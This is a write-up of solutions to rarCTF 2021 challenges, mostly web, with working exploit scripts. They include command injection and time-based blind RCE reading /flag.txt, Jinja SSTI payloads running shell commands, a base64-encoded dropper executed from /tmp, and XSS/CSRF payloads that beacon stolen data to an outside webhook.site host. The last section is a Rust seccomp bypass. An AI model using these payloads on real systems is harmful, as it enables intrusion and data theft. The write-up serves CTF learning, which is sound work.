# rarCTF2021

## lemonthinker  

command injection using `$(cat /flag.txt | cut -c 10-25)` 

## Fancy Button Generator

using a tag src attribute to get xss with `javascript:xxx`
```python
s = requests.Session()
host = 'https://fbg.rars.win/'
data = s.get(host + "pow").json()
print(data)
print("Solving POW")
solution = solve(data['pref'], data['suff'], 5)
print(f"Solved: {solution}")
s.post(host + "pow", json={"answer": solution})
r = s.post(f"{host}admin", params = {
    'title':'byc',
    'link':"javascript:navigator.sendBeacon('https://webhook.site/3bca99ef-559a-4834-b773-df91d1ccf5b2', localStorage.flag)"
})
print(r.text)
```

## Secure Uploader

`//////flag` 

## Microservices As A Service 1 

I use time-based  RCE. But ip will be banned in the fixed version
```python
URL = 'https://maas.rars.win/'


def req_calc():
    url = f'{URL}calculator'
    res = 'rarctf{0v3rk1ll_4s_4_s3rv1c3_3fca0faa}'
    for i in range(17, 100):
        print(i)
        for ch in '_' + '{' + '}' + string.printable:
            print(f'trying {ch}')
            t = time.time()
            r = requests.post(url, data={
                'mode': 'arithmetic',
                'add': '+',
                'n1': f"""__import__("os").system("if [ $(cat /flag.txt | cut -c {i}) = '{ch}' ];then sleep 3;fi\"""",
                'n2': ')'
            }, proxies=proxies)
            if r.status_code != 200:
                print('Error')
            if time.time() - t > 3:
                res += ch
                print(res)
                break
```

## Microservices As A Service 2

In the first version, it is easy to get ssti since the author forgot to use `bio = bio.reaplce('xxx','')`, so the filter can be ignored.

```python
def req_notes():
    url = f'{URL}/notes/profile'
    cookies = {
        'session': 'eyJub3Rlcy11c2VybmFtZSI6IjEyMzRkeHh4In0.YQ87fQ.NcSM8Cw_XO4RkLIx6zYnYzp3_PQ'
    }
    r = requests.post(url, cookies=cookies, data={
        'mode': 'bioadd',
        'bio': """{{request['application']['__globals__']['__builtins__']['__import__']('os')["popen"]("cat /flag.txt")["read"]()}}"""
    }, proxies=proxies)
    print(r.text)
```
## MAAS 2.5: Notes

The fixed version of last chall.
This time, remember that the calc service and the note service shared the same net `level-1`. So ssti can be 
achived through `http://notes:5000/render`. To get the response of flag, I write a python script so that I can set a `flag-flag_value` pair in redis 
by the notes service and read it in the notes public site by using `[[flag]]`

```python
def req_calc_fix():
    url = f'https://maas2.rars.win/calculator'
    # res = "rarctf{.replace"
    r = requests.post(url, data={
        'mode': 'arithmetic',
        'add': '+',
        'n1': f"""__import__("os").system("echo -n aW1wb3J0IHJlcXVlc3RzCgp1cmwgPSAnaHR0cDovL25vdGVzOjUwMDAvJwpyID0gcmVxdWVzdHMucG9zdChmJ3t1cmx9cmVuZGVyJywganNvbj17CiAgICAnYmlvJzogIiIie3tyZXF1ZXN0WydhcHBsaWNhdGlvbiddWydfX2dsb2JhbHNfXyddWydfX2J1aWx0aW5zX18nXVsnX19pbXBvcnRfXyddKCdvcycpWyJwb3BlbiJdKCJjYXQgL2ZsYWcudHh0IilbInJlYWQiXSgpfX0iIiIsCiAgICAnZGF0YSc6ICcxJwp9KQpmbGFnID0gci50ZXh0CgpyID0gcmVxdWVzdHMucG9zdChmJ3t1cmx9dXNlcmFjdGlvbicsIGRhdGE9eyJrZXkiOiAiZmxhZyIsICJ2YWx1ZSI6IGZsYWcsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgInVzZXJuYW1lIjogIjIyMzMzIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAibW9kZSI6ICJhZGRkYXRhIn0pCgo=|base64 -d > /tmp/exp.py \"""",
        'n2': ')'}, proxies=proxies)
    print(r.text)

    r = requests.post(url, data={
        'mode': 'arithmetic',
        'add': '+',
        'n1': f"""__import__("os").system("python3 /tmp/exp.py \"""",
        'n2': ')'}, proxies=proxies)
    print(r.text)
```
the content of `/tmp/exp.py` : 
```python
import requests

url = 'http://notes:5000/'
r = requests.post(f'{url}render', json={ 'bio': "{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /flag.txt')['read']()}}", 'data': '1' }) 
flag = r.text 
r = requests.post(f'{url}useraction', data={"key": "flag", "value": flag,
                                            "username": "22333",
                                            "mode": "adddata"})
```
## Microservices As A Service 3  && MAAS 3.5: User Manager

Same solution using `{"id":0,"password":"00000000000b","id":5}`, because python-jsonschema and golang-jsonparser parse JSON data differently.

## Secure Storage 

There are two sites in this chall, one is the `https://securestorage.rars.win/` and the other is `https://secureenclave.rars.win/`.
The latter one is loaded as an iframe in the former site.
* there is a xss in storage site because of handlebars and it can be triggered when logining in. Also `/api/login` is vulnerable to csrf so we get xss in securestorage site.
* the flag is stored in securenclave site, and we can set arbitary attributes of window in that site because of the code in `secure.js`
* to get the content of flag, we just need to get the content of iframe. And iframe can be read if they share the same domain. So we just need
to downgrade the doamin of both sites to `rars.win`, then we can use xss to access content of iframe.
poc:
```javascript
<script>
    document.domain = 'rars.win';
    setInterval(() => {
        console.log('polluting ...');
        document.getElementById('secure_storage').contentWindow.postMessage(['document.domain', 'rars.win'],'https://secureenclave.rars.win/')
    }, 1000);
    setInterval(() => {
        console.log('sending...');
        navigator.sendBeacon('https://webhook.site/3bca99ef-559a-4834-b773-df91d1ccf5b2',window.frames[0].document.getElementById('message').innerText);
    }, 1500);
</script>
```
submit payload as poc.html 
```html
<form action="https://securestorage.rars.win/api/login" method="POST" id="form">
    <input type="hidden" name="user" value="<script>document.domain = 'rars.win';setInterval(() => {console.log('polluting ...');document.getElementById('secure_storage').contentWindow.postMessage(['document.domain', 'rars.win'],'https://secureenclave.rars.win/')}, 1000);setInterval(() => {console.log('sending...');navigator.sendBeacon('https://webhook.site/3bca99ef-559a-4834-b773-df91d1ccf5b2', window.frames[0].document.getElementById('message').innerText);}, 1500);</script>">
    <input type="hidden" name="pass" value="123">
</form>
<script>form.submit()</script>
```

## Electroplating

I failed to solve it during the contest, the intended solution leads me to an issue of rust which says that `#[no_mangle]` can hijack C
library function. So The idea of this chall is to disable seccomp in this way, and we get arbitary code execution.
https://github.com/rust-lang/rust/issues/28179#issuecomment-138684364
The seccomp_load function is defined as c library function that it takes an integer as parameter and return an integer. We can simply overwrite it.

```html
<html>
<title><templ>"Page Title".to_string()</templ></title>
<h1><templ>"bruh".to_string()</templ></h1>

<templ>
use std::process::Command;
let output = Command::new("cat").arg("/flag.txt").output().unwrap().stdout;
use std::str;
    let s = match str::from_utf8(&output) {
        Ok(v) => v,
        Err(e) => panic!("Invalid UTF-8 sequence: {}", e),
    };
    s.to_string()

}

#[no_mangle]
#[link_section=".text"]
pub static seccomp_load: [u8; 1] = [195];

fn nothing() {
    ()

</templ>
</html>
```
Maybe time to learn Rust ? XD